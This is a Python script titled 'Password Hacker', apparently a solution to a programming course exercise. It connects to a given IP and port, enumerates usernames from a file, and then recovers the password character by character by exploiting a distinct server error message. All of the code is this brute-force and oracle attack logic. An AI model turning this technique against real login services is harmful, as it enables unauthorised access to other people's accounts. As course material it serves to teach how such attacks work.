# $Password Hacker
import argparse
import json
import os
import socket
from string import ascii_letters, digits
from itertools import product, count


def args():
    parser = argparse.ArgumentParser(description="This program receives 2 arguments \
     and tries to connect to address with generated password through a socket")
    parser.add_argument("IP", help="Type IP address like 127.0.0.1 ")
    parser.add_argument("port", default="9090",
                        help="Specify port like 9090")
    # parser.add_argument("message", help="Type message for sending")
    return parser.parse_args()


def take_login():
    file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
    with open(file_name, 'r', encoding='utf-8') as f:
        login_list = f.readlines()
        login_list = list(map(lambda x: x.replace('\n', ''), login_list))
    for length in range(1, len(login_list) + 1):
        for word in iter(login_list):
            yield word


def create_json(login, password=' '):
    """take login or login+password. Return JSON. """
    lp_dict = {}
    lp_dict.update({'login': login, 'password': password})
    return json.dumps(lp_dict)


def send_request(client, request):
    client.send(request.encode())  # converting to bytes, sending through socket
    return client.recv(1024).decode()  # decoding from bytes to string


def generate_password(client_, found_login, guess):
    chars = list(ascii_letters + digits)
    for character in chars:
        password = guess + str(character)
        data = create_json(found_login, password)
        response = send_request(client_, data)
        if response == json.dumps({"result": "Exception happened during login"}):
            # print(response)
            # print(password)
            return password
        elif response == json.dumps({"result": "Connection success!"}):
            # print(response)
            return ('found!', password)


with socket.socket() as client_socket:
    arguments = args()
    hostname = arguments.IP
    port = int(arguments.port)
    address = (hostname, port)
    # print(address)
    login_ = ''
    
    client_socket.connect(address)
    # 1.Try all logins with an empty password.
    for login in take_login():
        # send the combination of login and password in JSON format
        data = create_json(login)
        response = send_request(client_socket, data)  # decoding from bytes to string
        if response == json.dumps({"result": "Wrong password!"}):
            # print('login found')
            login_ = login
            break
    
    password_ = ''
    # print(password_)
    for _ in range(100):
    # while response != json.dumps({"result": "Connection success!"}):
        password = generate_password(client_socket, login_, password_)
        if password[0] == 'found!':
            # print(password)
            break
        else:
            data = create_json(login_, password)
            response = send_request(client_socket, data)
            password_ = password
            
    
    print(create_json(login_, password[1]))
